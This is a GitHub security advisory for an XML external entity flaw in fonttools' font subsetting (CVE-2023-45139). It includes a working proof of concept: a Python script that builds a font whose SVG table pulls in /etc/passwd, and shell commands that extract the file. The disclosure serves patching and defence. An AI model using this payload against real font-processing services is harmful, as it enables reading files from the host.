# [H] fonttools XML External Entity Injection (XXE) Vulnerability

## Summary
Severity: High
Advisory: GHSA-6673-4983-2vx5
CVE: CVE-2023-45139
CWE: CWE-611
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2024-01-09
Source: https://github.com/advisories/GHSA-6673-4983-2vx5
Type: github-advisory

## Affected
- PyPI: `fonttools` — affected >=4.28.2 <4.43.0

## Details
### Summary

As of `fonttools>=4.28.2` the subsetting module has a XML External Entity Injection (XXE) vulnerability which allows an attacker to resolve arbitrary entities when a candidate font (OT-SVG fonts), which contains a SVG table, is parsed. 

This allows attackers to include arbitrary files from the filesystem fontTools is running on or make web requests from the host system. 

### PoC


The vulnerability can be reproduced following the bellow steps on a unix based system.

1. Build a OT-SVG font which includes a external entity in the SVG table which resolves a local file. In our testing we utilised `/etc/passwd` for our POC file to include and modified an existing subset integration test to build the POC font - see bellow.

```python

from string import ascii_letters
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen
from fontTools.ttLib import newTable


XXE_SVG = """\
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <g id="glyph1">
    <text font-size="10" x="0" y="10">&test;</text>
  </g>
</svg>
"""

def main():
    # generate a random TTF font with an SVG table
    glyph_order = [".notdef"] + list(ascii_letters)
    pen = TTGlyphPen(glyphSet=None)
    pen.moveTo((0, 0))
    pen.lineTo((0, 500))
    pen.lineTo((500, 500))
    pen.lineTo((500, 0))
    pen.closePath()
    glyph = pen.glyph()
    glyphs = {g: glyph for g in glyph_order}

    fb = FontBuilder(unitsPerEm=1024, isTTF=True)
    fb.setupGlyphOrder(glyph_order)
    fb.setupCharacterMap({ord(c): c for c in ascii_letters})
    fb.setupGlyf(glyphs)
    fb.setupHorizontalMetrics({g: (500, 0) for g in glyph_order})
    fb.setupHorizontalHeader()
    fb.setupOS2()
    fb.setupPost()
    fb.setupNameTable({"familyName": "TestSVG", "styleName": "Regular"})

    svg_table = newTable("SVG ")
    svg_table.docList = [
       (XXE_SVG, 1, 12)
    ]
    fb.font["SVG "] = svg_table

    fb.font.save('poc-payload.ttf')

if __name__ == '__main__':
    main()

```

2. Subset the font with an affected version of fontTools - we tested on `fonttools==4.42.1` and `fonttools==4.28.2` - using the following flags (which just ensure the malicious glyph is mapped by the font and not discard in the subsetting process):

```shell
pyftsubset poc-payload.ttf --output-file="poc-payload.subset.ttf" --unicodes="*" --ignore-missing-glyphs
```

3. Read the parsed SVG table in the subsetted font:

```shell
ttx -t SVG poc-payload.subset.ttf && cat poc-payload.subset.ttx
```

Observed the included contents of the `/etc/passwd` file. 

### Impact

Note the final severity is dependant on the environment fontTools is running in.

- The vulnerability has the most impact on consumers of fontTools who leverage the subsetting utility to subset untrusted OT-SVG fonts where the vulnerability may be exploited to read arbitrary files from the filesystem of the host fonttools is running on



### Possible Mitigations 

There may be other ways to mitigate the issue, but some suggestions:

1. Set the `resolve_entities=False` flag on parsing methods
2. Consider further methods of disallowing doctype declarations
3. Consider recursive regex matching

## References
- https://github.com/fonttools/fonttools/security/advisories/GHSA-6673-4983-2vx5
- https://nvd.nist.gov/vuln/detail/CVE-2023-45139
- https://github.com/fonttools/fonttools/commit/9f61271dc1ca82ed91f529b130fe5dc5c9bf1f4c
- https://github.com/fonttools/fonttools
- https://github.com/fonttools/fonttools/releases/tag/4.43.0
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VY63B4SGY4QOQGUXMECRGD6K3YT3GJ75
- http://www.openwall.com/lists/oss-security/2024/03/08/2
- http://www.openwall.com/lists/oss-security/2024/03/09/1
